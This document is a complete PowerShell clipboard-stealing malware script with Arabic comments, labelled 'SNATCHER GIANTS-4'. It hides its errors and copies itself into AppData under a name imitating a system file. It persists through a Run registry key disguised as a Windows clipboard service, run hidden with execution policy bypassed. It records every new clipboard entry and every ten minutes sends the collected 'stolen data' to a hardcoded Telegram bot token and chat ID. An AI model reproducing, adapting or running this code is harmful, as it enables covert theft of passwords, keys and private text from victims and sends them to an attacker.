# --- [STARK OMEGA: SNATCHER GIANTS-4] ---
# الوظيفة: مراقبة الحافظة (Clipboard) وسحب البيانات المنسوخة كل 10 دقائق

$ErrorActionPreference = 'SilentlyContinue'

# الثوابت
$BOT_TOKEN = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$CHAT_ID = "7393359923"

# آلية البقاء (Persistence)
$path = "$env:APPDATA\Microsoft\Windows\System32_ClipHost.ps1"
if (!(Test-Path $path)) {
    $MyContent = (New-Object Net.WebClient).DownloadString($MyInvocation.MyCommand.Definition)
    $MyContent | Out-File -FilePath $path
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsClipboardService' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
}

$LastClip = ""
$StolenData = @()
$Timer = [System.Diagnostics.Stopwatch]::StartNew()

while($true) {
    try {
        # سحب محتوى الحافظة الحالي
        $CurrentClip = Get-Clipboard -Raw
        
        # التأكد إن النص جديد ومش متكرر
        if ($CurrentClip -and ($CurrentClip -ne $LastClip)) {
            $LastClip = $CurrentClip
            $Timestamp = Get-Date -Format "HH:mm:ss"
            $StolenData += "📌 [$Timestamp]: $CurrentClip"
        }
    } catch {}

    # الإرسال كل 10 دقائق (600 ثانية)
    if ($Timer.Elapsed.TotalSeconds -ge 600) {
        if ($StolenData.Count -gt 0) {
            $Report = $StolenData -join "`n------------------`n"
            $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
            $body = @{ chat_id = $CHAT_ID; text = "<b>📋 صيد الحافظة (The Snatcher):</b>`n<code>$Report</code>"; parse_mode = "HTML" }
            Invoke-RestMethod -Uri $url -Method Post -Body $body
            $StolenData = @() # تصفير القائمة بعد الإرسال
        }
        $Timer.Restart()
    }
    
    Start-Sleep -Seconds 5 # فحص كل 5 ثواني لضمان عدم استهلاك المعالج
}
